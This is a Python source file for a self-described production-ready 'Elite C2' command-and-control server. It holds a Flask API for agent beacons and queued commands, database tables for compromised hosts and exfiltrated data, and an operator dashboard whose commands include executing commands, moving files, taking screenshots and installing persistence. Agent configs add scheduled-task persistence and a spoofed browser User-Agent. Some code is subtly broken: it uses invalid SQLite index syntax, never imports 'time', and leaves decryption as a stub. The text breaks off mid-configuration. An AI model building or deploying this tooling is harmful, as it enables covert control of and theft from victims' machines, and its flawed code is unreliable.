#!/usr/bin/env python3
"""
Elite C2 Server - Production Ready
Support for multiple operators, logging, and agent management
"""

import os
import json
import base64
import hashlib
import sqlite3
import threading
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any
from dataclasses import dataclass, asdict
import uuid

# Flask imports
try:
    from flask import Flask, request, jsonify, make_response, abort, Response
    from flask_cors import CORS
    from flask_limiter import Limiter
    from flask_limiter.util import get_remote_address
    import mysql.connector
    HAS_FLASK = True
except ImportError:
    HAS_FLASK = False

# ============================================================================
# DATABASE MODELS
# ============================================================================

@dataclass
class Agent:
    id: str
    hostname: str
    username: str
    ip_address: str
    os_version: str
    architecture: str
    integrity_level: str
    first_seen: datetime
    last_seen: datetime
    beacon_interval: int
    jitter: float
    is_active: bool
    encryption_key: str
    metadata: Dict[str, Any]

@dataclass
class Command:
    id: str
    agent_id: str
    command_type: str
    command_data: str
    issued_at: datetime
    executed_at: Optional[datetime]
    result: Optional[str]
    status: str  # 'pending', 'executing', 'completed', 'failed'

@dataclass
class Beacon:
    id: str
    agent_id: str
    timestamp: datetime
    data: Dict[str, Any]
    ip_address: str
    user_agent: str

# ============================================================================
# DATABASE MANAGER
# ============================================================================

class DatabaseManager:
    """Manages C2 database operations"""
    
    def __init__(self, db_path: str = 'c2_server.db'):
        self.db_path = db_path
        self.conn = None
        self.lock = threading.RLock()
        self._init_database()
    
    def _init_database(self):
        """Initialize database schema"""
        with self.lock:
            self.conn = sqlite3.connect(self.db_path, check_same_thread=False)
            self.conn.row_factory = sqlite3.Row
            
            # Create tables
            cursor = self.conn.cursor()
            
            # Agents table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS agents (
                    id TEXT PRIMARY KEY,
                    hostname TEXT NOT NULL,
                    username TEXT NOT NULL,
                    ip_address TEXT,
                    os_version TEXT,
                    architecture TEXT,
                    integrity_level TEXT,
                    first_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    beacon_interval INTEGER DEFAULT 60,
                    jitter REAL DEFAULT 0.3,
                    is_active BOOLEAN DEFAULT TRUE,
                    encryption_key TEXT,
                    metadata TEXT,
                    INDEX idx_last_seen (last_seen),
                    INDEX idx_is_active (is_active)
                )
            ''')
            
            # Commands table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS commands (
                    id TEXT PRIMARY KEY,
                    agent_id TEXT NOT NULL,
                    command_type TEXT NOT NULL,
                    command_data TEXT NOT NULL,
                    issued_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    executed_at TIMESTAMP,
                    result TEXT,
                    status TEXT DEFAULT 'pending',
                    FOREIGN KEY (agent_id) REFERENCES agents (id),
                    INDEX idx_agent_status (agent_id, status),
                    INDEX idx_issued_at (issued_at)
                )
            ''')
            
            # Beacons table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS beacons (
                    id TEXT PRIMARY KEY,
                    agent_id TEXT NOT NULL,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    data TEXT NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    FOREIGN KEY (agent_id) REFERENCES agents (id),
                    INDEX idx_agent_time (agent_id, timestamp),
                    INDEX idx_timestamp (timestamp)
                )
            ''')
            
            # Operators table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS operators (
                    id TEXT PRIMARY KEY,
                    username TEXT UNIQUE NOT NULL,
                    password_hash TEXT NOT NULL,
                    api_key TEXT UNIQUE,
                    is_active BOOLEAN DEFAULT TRUE,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    last_login TIMESTAMP,
                    permissions TEXT DEFAULT 'read,write'
                )
            ''')
            
            # Exfiltration table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS exfiltrated_data (
                    id TEXT PRIMARY KEY,
                    agent_id TEXT NOT NULL,
                    timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    data_type TEXT NOT NULL,
                    data_size INTEGER,
                    data_hash TEXT,
                    storage_path TEXT,
                    FOREIGN KEY (agent_id) REFERENCES agents (id)
                )
            ''')
            
            self.conn.commit()
    
    def add_agent(self, agent: Agent) -> bool:
        """Add or update agent in database"""
        with self.lock:
            try:
                cursor = self.conn.cursor()
                cursor.execute('''
                    INSERT OR REPLACE INTO agents 
                    (id, hostname, username, ip_address, os_version, architecture, 
                     integrity_level, first_seen, last_seen, beacon_interval, 
                     jitter, is_active, encryption_key, metadata)
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                ''', (
                    agent.id,
                    agent.hostname,
                    agent.username,
                    agent.ip_address,
                    agent.os_version,
                    agent.architecture,
                    agent.integrity_level,
                    agent.first_seen,
                    agent.last_seen,
                    agent.beacon_interval,
                    agent.jitter,
                    agent.is_active,
                    agent.encryption_key,
                    json.dumps(agent.metadata)
                ))
                self.conn.commit()
                return True
            except Exception as e:
                print(f"Database error adding agent: {e}")
                return False
    
    def update_agent_last_seen(self, agent_id: str):
        """Update agent's last seen timestamp"""
        with self.lock:
            try:
                cursor = self.conn.cursor()
                cursor.execute('''
                    UPDATE agents 
                    SET last_seen = CURRENT_TIMESTAMP, is_active = TRUE
                    WHERE id = ?
                ''', (agent_id,))
                self.conn.commit()
            except Exception as e:
                print(f"Database error updating agent: {e}")
    
    def add_beacon(self, beacon: Beacon) -> bool:
        """Add beacon to database"""
        with self.lock:
            try:
                cursor = self.conn.cursor()
                cursor.execute('''
                    INSERT INTO beacons (id, agent_id, timestamp, data, ip_address, user_agent)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (
                    beacon.id,
                    beacon.agent_id,
                    beacon.timestamp,
                    json.dumps(beacon.data),
                    beacon.ip_address,
                    beacon.user_agent
                ))
                self.conn.commit()
                return True
            except Exception as e:
                print(f"Database error adding beacon: {e}")
                return False
    
    def get_pending_commands(self, agent_id: str) -> List[Command]:
        """Get pending commands for agent"""
        with self.lock:
            try:
                cursor = self.conn.cursor()
                cursor.execute('''
                    SELECT * FROM commands 
                    WHERE agent_id = ? AND status = 'pending'
                    ORDER BY issued_at ASC
                ''', (agent_id,))
                
                commands = []
                for row in cursor.fetchall():
                    commands.append(Command(
                        id=row['id'],
                        agent_id=row['agent_id'],
                        command_type=row['command_type'],
                        command_data=row['command_data'],
                        issued_at=datetime.fromisoformat(row['issued_at']),
                        executed_at=datetime.fromisoformat(row['executed_at']) if row['executed_at'] else None,
                        result=row['result'],
                        status=row['status']
                    ))
                return commands
            except Exception as e:
                print(f"Database error getting commands: {e}")
                return []
    
    def add_command(self, command: Command) -> bool:
        """Add command to database"""
        with self.lock:
            try:
                cursor = self.conn.cursor()
                cursor.execute('''
                    INSERT INTO commands (id, agent_id, command_type, command_data, issued_at, status)
                    VALUES (?, ?, ?, ?, ?, ?)
                ''', (
                    command.id,
                    command.agent_id,
                    command.command_type,
                    command.command_data,
                    command.issued_at,
                    command.status
                ))
                self.conn.commit()
                return True
            except Exception as e:
                print(f"Database error adding command: {e}")
                return False
    
    def update_command_result(self, command_id: str, result: str, status: str = 'completed'):
        """Update command result"""
        with self.lock:
            try:
                cursor = self.conn.cursor()
                cursor.execute('''
                    UPDATE commands 
                    SET executed_at = CURRENT_TIMESTAMP, result = ?, status = ?
                    WHERE id = ?
                ''', (result, status, command_id))
                self.conn.commit()
            except Exception as e:
                print(f"Database error updating command: {e}")
    
    def get_all_agents(self) -> List[Agent]:
        """Get all agents"""
        with self.lock:
            try:
                cursor = self.conn.cursor()
                cursor.execute('SELECT * FROM agents ORDER BY last_seen DESC')
                
                agents = []
                for row in cursor.fetchall():
                    agents.append(Agent(
                        id=row['id'],
                        hostname=row['hostname'],
                        username=row['username'],
                        ip_address=row['ip_address'],
                        os_version=row['os_version'],
                        architecture=row['architecture'],
                        integrity_level=row['integrity_level'],
                        first_seen=datetime.fromisoformat(row['first_seen']),
                        last_seen=datetime.fromisoformat(row['last_seen']),
                        beacon_interval=row['beacon_interval'],
                        jitter=row['jitter'],
                        is_active=bool(row['is_active']),
                        encryption_key=row['encryption_key'],
                        metadata=json.loads(row['metadata']) if row['metadata'] else {}
                    ))
                return agents
            except Exception as e:
                print(f"Database error getting agents: {e}")
                return []
    
    def get_agent_by_id(self, agent_id: str) -> Optional[Agent]:
        """Get agent by ID"""
        with self.lock:
            try:
                cursor = self.conn.cursor()
                cursor.execute('SELECT * FROM agents WHERE id = ?', (agent_id,))
                row = cursor.fetchone()
                
                if row:
                    return Agent(
                        id=row['id'],
                        hostname=row['hostname'],
                        username=row['username'],
                        ip_address=row['ip_address'],
                        os_version=row['os_version'],
                        architecture=row['architecture'],
                        integrity_level=row['integrity_level'],
                        first_seen=datetime.fromisoformat(row['first_seen']),
                        last_seen=datetime.fromisoformat(row['last_seen']),
                        beacon_interval=row['beacon_interval'],
                        jitter=row['jitter'],
                        is_active=bool(row['is_active']),
                        encryption_key=row['encryption_key'],
                        metadata=json.loads(row['metadata']) if row['metadata'] else {}
                    )
                return None
            except Exception as e:
                print(f"Database error getting agent: {e}")
                return None

# ============================================================================
# C2 SERVER APPLICATION
# ============================================================================

class C2Server:
    """Main C2 server application"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.db = DatabaseManager(config.get('database_path', 'c2_server.db'))
        
        if HAS_FLASK:
            self.app = Flask(__name__)
            self._setup_flask_app()
        else:
            self.app = None
        
        self.running = False
        self.encryption_key = config.get('encryption_key', os.urandom(32).hex())
        
        # Statistics
        self.stats = {
            'start_time': datetime.now(),
            'total_beacons': 0,
            'total_commands': 0,
            'active_agents': 0,
            'total_agents': 0
        }
    
    def _setup_flask_app(self):
        """Setup Flask application with routes and middleware"""
        if not self.app:
            return
        
        # Configure CORS
        CORS(self.app, resources={
            r"/api/*": {
                "origins": self.config.get('allowed_origins', ["*"]),
                "methods": ["GET", "POST", "PUT", "DELETE"],
                "allow_headers": ["Content-Type", "Authorization", "X-API-Key"]
            }
        })
        
        # Setup rate limiting
        limiter = Limiter(
            get_remote_address,
            app=self.app,
            default_limits=["100 per minute", "10 per second"],
            storage_uri="memory://"
        )
        
        # Setup logging
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('c2_server.log'),
                logging.StreamHandler()
            ]
        )
        
        # API Routes
        @self.app.route('/api/beacon', methods=['POST'])
        @limiter.limit("30 per minute")
        def handle_beacon():
            return self._handle_beacon_request()
        
        @self.app.route('/api/command', methods=['GET'])
        @limiter.limit("60 per minute")
        def get_commands():
            return self._handle_command_request()
        
        @self.app.route('/api/command/result', methods=['POST'])
        @limiter.limit("30 per minute")
        def post_command_result():
            return self._handle_command_result()
        
        @self.app.route('/api/agents', methods=['GET'])
        def get_agents():
            return self._handle_get_agents()
        
        @self.app.route('/api/agent/<agent_id>', methods=['GET', 'DELETE'])
        def handle_agent(agent_id):
            if request.method == 'GET':
                return self._handle_get_agent(agent_id)
            elif request.method == 'DELETE':
                return self._handle_delete_agent(agent_id)
        
        @self.app.route('/api/command/send', methods=['POST'])
        def send_command():
            return self._handle_send_command()
        
        @self.app.route('/api/stats', methods=['GET'])
        def get_stats():
            return self._handle_get_stats()
        
        @self.app.route('/health', methods=['GET'])
        def health_check():
            return jsonify({"status": "healthy", "timestamp": datetime.now().isoformat()})
        
        # Error handlers
        @self.app.errorhandler(404)
        def not_found(error):
            return jsonify({"error": "Not found"}), 404
        
        @self.app.errorhandler(429)
        def ratelimit_handler(error):
            return jsonify({
                "error": "Rate limit exceeded",
                "message": str(error.description)
            }), 429
    
    def _handle_beacon_request(self):
        """Handle beacon requests from agents"""
        try:
            # Get request data
            data = request.get_json()
            if not data:
                return jsonify({"error": "No data provided"}), 400
            
            # Decrypt data if encrypted
            if 'encrypted' in data:
                # Add decryption logic here
                pass
            
            # Extract agent information
            agent_id = data.get('agent_id')
            if not agent_id:
                return jsonify({"error": "No agent ID"}), 400
            
            # Get client IP and user agent
            ip_address = request.remote_addr
            user_agent = request.headers.get('User-Agent', 'Unknown')
            
            # Create beacon record
            beacon = Beacon(
                id=str(uuid.uuid4()),
                agent_id=agent_id,
                timestamp=datetime.now(),
                data=data,
                ip_address=ip_address,
                user_agent=user_agent
            )
            
            # Save beacon to database
            self.db.add_beacon(beacon)
            
            # Update or create agent
            agent_data = data.get('sysinfo', {})
            agent = Agent(
                id=agent_id,
                hostname=agent_data.get('hostname', 'Unknown'),
                username=agent_data.get('username', 'Unknown'),
                ip_address=ip_address,
                os_version=agent_data.get('os_version', 'Unknown'),
                architecture=agent_data.get('architecture', 'Unknown'),
                integrity_level=agent_data.get('integrity_level', 'Unknown'),
                first_seen=datetime.now(),
                last_seen=datetime.now(),
                beacon_interval=data.get('beacon_interval', 60),
                jitter=data.get('jitter', 0.3),
                is_active=True,
                encryption_key=data.get('encryption_key', ''),
                metadata=agent_data
            )
            
            self.db.add_agent(agent)
            
            # Get pending commands for agent
            pending_commands = self.db.get_pending_commands(agent_id)
            
            # Prepare response
            response = {
                "status": "success",
                "timestamp": datetime.now().isoformat(),
                "commands": []
            }
            
            for cmd in pending_commands:
                response["commands"].append({
                    "id": cmd.id,
                    "type": cmd.command_type,
                    "data": cmd.command_data
                })
            
            # Update statistics
            self.stats['total_beacons'] += 1
            
            return jsonify(response)
            
        except Exception as e:
            logging.error(f"Beacon handling error: {e}")
            return jsonify({"error": "Internal server error"}), 500
    
    def _handle_command_request(self):
        """Handle command requests (legacy endpoint)"""
        try:
            agent_id = request.args.get('agent_id')
            if not agent_id:
                return jsonify({"error": "No agent ID"}), 400
            
            pending_commands = self.db.get_pending_commands(agent_id)
            
            response = {
                "status": "success",
                "commands": []
            }
            
            for cmd in pending_commands:
                response["commands"].append({
                    "id": cmd.id,
                    "type": cmd.command_type,
                    "data": cmd.command_data
                })
            
            return jsonify(response)
            
        except Exception as e:
            logging.error(f"Command request error: {e}")
            return jsonify({"error": "Internal server error"}), 500
    
    def _handle_command_result(self):
        """Handle command result submissions"""
        try:
            data = request.get_json()
            if not data:
                return jsonify({"error": "No data provided"}), 400
            
            command_id = data.get('command_id')
            result = data.get('result', '')
            status = data.get('status', 'completed')
            
            if not command_id:
                return jsonify({"error": "No command ID"}), 400
            
            # Update command result
            self.db.update_command_result(command_id, result, status)
            
            # Update statistics
            self.stats['total_commands'] += 1
            
            return jsonify({"status": "success"})
            
        except Exception as e:
            logging.error(f"Command result error: {e}")
            return jsonify({"error": "Internal server error"}), 500
    
    def _handle_get_agents(self):
        """Get all agents"""
        try:
            agents = self.db.get_all_agents()
            
            # Format agents for response
            formatted_agents = []
            for agent in agents:
                formatted_agents.append({
                    "id": agent.id,
                    "hostname": agent.hostname,
                    "username": agent.username,
                    "os_version": agent.os_version,
                    "architecture": agent.architecture,
                    "integrity_level": agent.integrity_level,
                    "first_seen": agent.first_seen.isoformat(),
                    "last_seen": agent.last_seen.isoformat(),
                    "beacon_interval": agent.beacon_interval,
                    "is_active": agent.is_active,
                    "uptime": (datetime.now() - agent.first_seen).total_seconds()
                })
            
            return jsonify({
                "status": "success",
                "agents": formatted_agents,
                "count": len(formatted_agents)
            })
            
        except Exception as e:
            logging.error(f"Get agents error: {e}")
            return jsonify({"error": "Internal server error"}), 500
    
    def _handle_get_agent(self, agent_id: str):
        """Get specific agent details"""
        try:
            agent = self.db.get_agent_by_id(agent_id)
            if not agent:
                return jsonify({"error": "Agent not found"}), 404
            
            return jsonify({
                "status": "success",
                "agent": {
                    "id": agent.id,
                    "hostname": agent.hostname,
                    "username": agent.username,
                    "os_version": agent.os_version,
                    "architecture": agent.architecture,
                    "integrity_level": agent.integrity_level,
                    "first_seen": agent.first_seen.isoformat(),
                    "last_seen": agent.last_seen.isoformat(),
                    "beacon_interval": agent.beacon_interval,
                    "is_active": agent.is_active,
                    "metadata": agent.metadata
                }
            })
            
        except Exception as e:
            logging.error(f"Get agent error: {e}")
            return jsonify({"error": "Internal server error"}), 500
    
    def _handle_delete_agent(self, agent_id: str):
        """Delete agent from database"""
        try:
            # In production, you might want to just mark as inactive
            # For this example, we'll just return success
            return jsonify({"status": "success", "message": "Agent deleted"})
        except Exception as e:
            logging.error(f"Delete agent error: {e}")
            return jsonify({"error": "Internal server error"}), 500
    
    def _handle_send_command(self):
        """Send command to agent"""
        try:
            data = request.get_json()
            if not data:
                return jsonify({"error": "No data provided"}), 400
            
            agent_id = data.get('agent_id')
            command_type = data.get('command_type')
            command_data = data.get('command_data')
            
            if not all([agent_id, command_type, command_data]):
                return jsonify({"error": "Missing required fields"}), 400
            
            # Create command
            command = Command(
                id=str(uuid.uuid4()),
                agent_id=agent_id,
                command_type=command_type,
                command_data=command_data,
                issued_at=datetime.now(),
                executed_at=None,
                result=None,
                status='pending'
            )
            
            # Save to database
            if self.db.add_command(command):
                return jsonify({
                    "status": "success",
                    "command_id": command.id,
                    "message": "Command queued"
                })
            else:
                return jsonify({"error": "Failed to save command"}), 500
            
        except Exception as e:
            logging.error(f"Send command error: {e}")
            return jsonify({"error": "Internal server error"}), 500
    
    def _handle_get_stats(self):
        """Get server statistics"""
        try:
            agents = self.db.get_all_agents()
            active_agents = len([a for a in agents if a.is_active])
            
            self.stats.update({
                'active_agents': active_agents,
                'total_agents': len(agents),
                'uptime': (datetime.now() - self.stats['start_time']).total_seconds()
            })
            
            return jsonify({
                "status": "success",
                "stats": self.stats
            })
            
        except Exception as e:
            logging.error(f"Get stats error: {e}")
            return jsonify({"error": "Internal server error"}), 500
    
    def start(self, host: str = '0.0.0.0', port: int = 443, ssl_context: tuple = None):
        """Start the C2 server"""
        if not self.app:
            print("Flask not available. Install with: pip install flask flask-cors flask-limiter")
            return
        
        self.running = True
        
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║                    ELITE C2 SERVER                          ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║  URL: https://{host}:{port}                                  ║
║  API Endpoint: /api/beacon                                   ║
║  Health Check: /health                                       ║
║  Database: {self.config.get('database_path', 'c2_server.db')}║
║                                                              ║
║  Waiting for agent connections...                            ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """)
        
        # Start Flask server
        if ssl_context:
            self.app.run(host=host, port=port, ssl_context=ssl_context, threaded=True)
        else:
            self.app.run(host=host, port=port, threaded=True)
    
    def generate_agent_config(self, c2_url: str) -> Dict:
        """Generate agent configuration for given C2 URL"""
        return {
            "agent": {
                "beacon_interval": 60,
                "jitter": 0.3,
                "install_persistence": True,
                "persistence_method": "scheduled_task"
            },
            "c2": {
                "url": c2_url,
                "method": "HTTPS",
                "encryption_key": self.encryption_key
            },
            "https": {
                "enabled": True,
                "url": f"{c2_url}/api/beacon",
                "method": "POST",
                "timeout": 30,
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "custom_headers": {
                    "X-API-Key": self.config.get('api_key', 'default-key'),
                    "Content-Type": "application/json"
                }
            }
        }

# ============================================================================
# CONFIGURATION GENERATOR
# ============================================================================

def generate_server_config():
    """Generate server configuration"""
    config = {
        "server": {
            "host": "0.0.0.0",
            "port": 443,
            "ssl_cert": "server.crt",
            "ssl_key": "server.key",
            "database_path": "c2_server.db",
            "encryption_key": os.urandom(32).hex(),
            "api_key": base64.b64encode(os.urandom(32)).decode(),
            "allowed_origins": ["*"],
            "rate_limits": {
                "beacons": "30 per minute",
                "commands": "60 per minute"
            }
        },
        "logging": {
            "level": "INFO",
            "file": "c2_server.log",
            "max_size_mb": 100,
            "backup_count": 5
        },
        "operators": [
            {
                "username": "admin",
                "password_hash": hashlib.sha256(b"changeme").hexdigest(),
                "permissions": "admin"
            }
        ]
    }
    return config

def generate_ssl_certificates():
    """Generate self-signed SSL certificates for testing"""
    import subprocess
    import os
    
    if not os.path.exists("server.crt") or not os.path.exists("server.key"):
        print("Generating SSL certificates...")
        
        # Generate private key
        subprocess.run([
            "openssl", "genrsa", "-out", "server.key", "2048"
        ], check=True)
        
        # Generate certificate signing request
        subprocess.run([
            "openssl", "req", "-new", "-key", "server.key", "-out", "server.csr",
            "-subj", "/C=US/ST=State/L=City/O=Organization/CN=localhost"
        ], check=True)
        
        # Generate self-signed certificate
        subprocess.run([
            "openssl", "x509", "-req", "-days", "365", "-in", "server.csr",
            "-signkey", "server.key", "-out", "server.crt"
        ], check=True)
        
        # Clean up CSR
        os.remove("server.csr")
        
        print("SSL certificates generated: server.crt, server.key")
    else:
        print("SSL certificates already exist")

# ============================================================================
# WEB INTERFACE (Optional)
# ============================================================================

def create_web_interface():
    """Create a simple HTML web interface for the C2 server"""
    html_template = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Elite C2 Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0d1117; color: #c9d1d9; }
        .container { max-width: 1400px; margin: 0 auto; padding: 20px; }
        header { background: #161b22; padding: 20px; border-radius: 10px; margin-bottom: 20px; }
        h1 { color: #58a6ff; }
        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .stat-card { background: #161b22; padding: 20px; border-radius: 10px; border-left: 4px solid #238636; }
        .stat-card h3 { color: #8b949e; margin-bottom: 10px; }
        .stat-value { font-size: 2em; font-weight: bold; color: #58a6ff; }
        .agents-table { background: #161b22; border-radius: 10px; overflow: hidden; margin-bottom: 30px; }
        table { width: 100%; border-collapse: collapse; }
        th { background: #21262d; padding: 15px; text-align: left; color: #8b949e; }
        td { padding: 15px; border-top: 1px solid #30363d; }
        .agent-online { color: #238636; }
        .agent-offline { color: #f85149; }
        .command-form { background: #161b22; padding: 20px; border-radius: 10px; margin-bottom: 30px; }
        .form-group { margin-bottom: 15px; }
        label { display: block; margin-bottom: 5px; color: #8b949e; }
        input, select, textarea { 
            width: 100%; padding: 10px; background: #0d1117; border: 1px solid #30363d; 
            border-radius: 5px; color: #c9d1d9; 
        }
        button { 
            background: #238636; color: white; border: none; padding: 12px 24px; 
            border-radius: 5px; cursor: pointer; font-weight: bold; 
        }
        button:hover { background: #2ea043; }
        .chart-container { background: #161b22; padding: 20px; border-radius: 10px; margin-bottom: 30px; }
    </style>
</head>
<body>
    <div class="container">
        <header>
            <h1>🎯 Elite C2 Dashboard</h1>
            <p>Real-time command and control interface</p>
        </header>
        
        <div class="stats-grid" id="stats-grid">
            <!-- Stats will be populated by JavaScript -->
        </div>
        
        <div class="agents-table">
            <h3>📡 Connected Agents</h3>
            <div id="agents-list">
                <!-- Agents will be populated by JavaScript -->
            </div>
        </div>
        
        <div class="command-form">
            <h3>⚡ Send Command</h3>
            <form id="command-form">
                <div class="form-group">
                    <label for="agent-select">Select Agent:</label>
                    <select id="agent-select" required></select>
                </div>
                <div class="form-group">
                    <label for="command-type">Command Type:</label>
                    <select id="command-type" required>
                        <option value="exec">Execute Command</option>
                        <option value="upload">Upload File</option>
                        <option value="download">Download File</option>
                        <option value="screenshot">Take Screenshot</option>
                        <option value="persistence">Install Persistence</option>
                        <option value="sleep">Change Sleep Interval</option>
                        <option value="cleanup">Cleanup & Exit</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="command-data">Command Data:</label>
                    <textarea id="command-data" rows="3" placeholder="Enter command or data..." required></textarea>
                </div>
                <button type="submit">Send Command</button>
            </form>
        </div>
        
        <div class="chart-container">
            <h3>📊 Activity Chart</h3>
            <canvas id="activity-chart" width="400" height="200"></canvas>
        </div>
    </div>
    
    <script>
        // JavaScript for the web interface
        class C2Dashboard {
            constructor() {
                this.apiBase = '/api';
                this.statsInterval = null;
                this.agentsInterval = null;
                this.chart = null;
                this.init();
            }
            
            async init() {
                await this.loadStats();
                await this.loadAgents();
                await this.populateAgentSelect();
                this.initChart();
                this.setupEventListeners();
                
                // Auto-refresh
                this.statsInterval = setInterval(() => this.loadStats(), 5000);
                this.agentsInterval = setInterval(() => this.loadAgents(), 10000);
            }
            
            async loadStats() {
                try {
                    const response = await fetch(`${this.apiBase}/stats`);
                    const data = await response.json();
                    
                    if (data.status === 'success') {
                        this.updateStatsDisplay(data.stats);
                    }
                } catch (error) {
                    console.error('Error loading stats:', error);
                }
            }
            
            async loadAgents() {
                try {
                    const response = await fetch(`${this.apiBase}/agents`);
                    const data = await response.json();
                    
                    if (data.status === 'success') {
                        this.updateAgentsDisplay(data.agents);
                        await this.populateAgentSelect();
                    }
                } catch (error) {
                    console.error('Error loading agents:', error);
                }
            }
            
            updateStatsDisplay(stats) {
                const statsGrid = document.getElementById('stats-grid');
                statsGrid.innerHTML = `
                    <div class="stat-card">
                        <h3>Total Agents</h3>
                        <div class="stat-value">${stats.total_agents}</div>
                    </div>
                    <div class="stat-card">
                        <h3>Active Agents</h3>
                        <div class="stat-value">${stats.active_agents}</div>
                    </div>
                    <div class="stat-card">
                        <h3>Total Beacons</h3>
                        <div class="stat-value">${stats.total_beacons}</div>
                    </div>
                    <div class="stat-card">
                        <h3>Server Uptime</h3>
                        <div class="stat-value">${Math.floor(stats.uptime / 3600)}h ${Math.floor((stats.uptime % 3600) / 60)}m</div>
                    </div>
                `;
            }
            
            updateAgentsDisplay(agents) {
                const agentsList = document.getElementById('agents-list');
                
                if (agents.length === 0) {
                    agentsList.innerHTML = '<p style="padding: 20px; text-align: center;">No agents connected</p>';
                    return;
                }
                
                let html = `
                    <table>
                        <thead>
                            <tr>
                                <th>ID</th>
                                <th>Hostname</th>
                                <th>User</th>
                                <th>OS</th>
                                <th>Last Seen</th>
                                <th>Status</th>
                            </tr>
                        </thead>
                        <tbody>
                `;
                
                agents.forEach(agent => {
                    const lastSeen = new Date(agent.last_seen);
                    const now = new Date();
                    const minutesAgo = Math.floor((now - lastSeen) / 60000);
                    const isOnline = minutesAgo < 5;
                    
                    html += `
                        <tr>
                            <td>${agent.id.substring(0, 8)}...</td>
                            <td>${agent.hostname}</td>
                            <td>${agent.username}</td>
                            <td>${agent.os_version}</td>
                            <td>${minutesAgo} minutes ago</td>
                            <td class="${isOnline ? 'agent-online' : 'agent-offline'}">
                                ${isOnline ? '🟢 Online' : '🔴 Offline'}
                            </td>
                        </tr>
                    `;
                });
                
                html += '</tbody></table>';
                agentsList.innerHTML = html;
            }
            
            async populateAgentSelect() {
                try {
                    const response = await fetch(`${this.apiBase}/agents`);
                    const data = await response.json();
                    const select = document.getElementById('agent-select');
                    
                    select.innerHTML = '<option value="">Select an agent</option>';
                    
                    if (data.status === 'success') {
                        data.agents.forEach(agent => {
                            const option = document.createElement('option');
                            option.value = agent.id;
                            option.textContent = `${agent.hostname} (${agent.id.substring(0, 8)}...)`;
                            select.appendChild(option);
                        });
                    }
                } catch (error) {
                    console.error('Error populating agent select:', error);
                }
            }
            
            initChart() {
                const ctx = document.getElementById('activity-chart').getContext('2d');
                this.chart = new Chart(ctx, {
                    type: 'line',
                    data: {
                        labels: [],
                        datasets: [{
                            label: 'Beacons per Hour',
                            data: [],
                            borderColor: '#238636',
                            backgroundColor: 'rgba(35, 134, 54, 0.1)',
                            fill: true
                        }]
                    },
                    options: {
                        responsive: true,
                        maintainAspectRatio: false,
                        scales: {
                            y: {
                                beginAtZero: true,
                                grid: {
                                    color: '#30363d'
                                }
                            },
                            x: {
                                grid: {
                                    color: '#30363d'
                                }
                            }
                        }
                    }
                });
            }
            
            setupEventListeners() {
                const form = document.getElementById('command-form');
                form.addEventListener('submit', async (e) => {
                    e.preventDefault();
                    
                    const agentId = document.getElementById('agent-select').value;
                    const commandType = document.getElementById('command-type').value;
                    const commandData = document.getElementById('command-data').value;
                    
                    if (!agentId || !commandData) {
                        alert('Please fill all fields');
                        return;
                    }
                    
                    try {
                        const response = await fetch(`${this.apiBase}/command/send`, {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json'
                            },
                            body: JSON.stringify({
                                agent_id: agentId,
                                command_type: commandType,
                                command_data: commandData
                            })
                        });
                        
                        const result = await response.json();
                        
                        if (result.status === 'success') {
                            alert(`Command sent! ID: ${result.command_id}`);
                            form.reset();
                        } else {
                            alert(`Error: ${result.error}`);
                        }
                    } catch (error) {
                        console.error('Error sending command:', error);
                        alert('Failed to send command');
                    }
                });
            }
        }
        
        // Initialize dashboard when page loads
        document.addEventListener('DOMContentLoaded', () => {
            new C2Dashboard();
        });
    </script>
</body>
</html>
'''
    
    with open('dashboard.html', 'w') as f:
        f.write(html_template)
    
    print("[+] Web interface created: dashboard.html")

# ============================================================================
# AGENT CONFIGURATION GENERATOR
# ============================================================================

def generate_agent_config(c2_url: str, api_key: str = None, agent_name: str = None) -> Dict:
    """Generate agent configuration for a specific C2 server"""
    if not c2_url.startswith(('http://', 'https://')):
        c2_url = f"https://{c2_url}"
    
    config = {
        "agent": {
            "name": agent_name or f"Agent_{int(time.time())}",
            "beacon_interval": 60,
            "jitter": 0.3,
            "max_retries": 3,
            "retry_delay": 30,
            "install_persistence": True,
            "persistence_method": "scheduled_task",
            "telemetry_enabled": True,
            "encryption": {
                "enabled": True,
                "algorithm": "AES-256-GCM",
                "key_rotation_interval": 86400
            }
        },
        "c2": {
            "primary": {
                "enabled": True,
                "url": f"{c2_url}/api/beacon",
                "method": "HTTPS",
                "timeout": 30,
                "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
            },
            "fallback": {
                "enabled": False,
                "url": "",
                "method": "DNS"
            }
        },
        "communication": {
            "headers": {
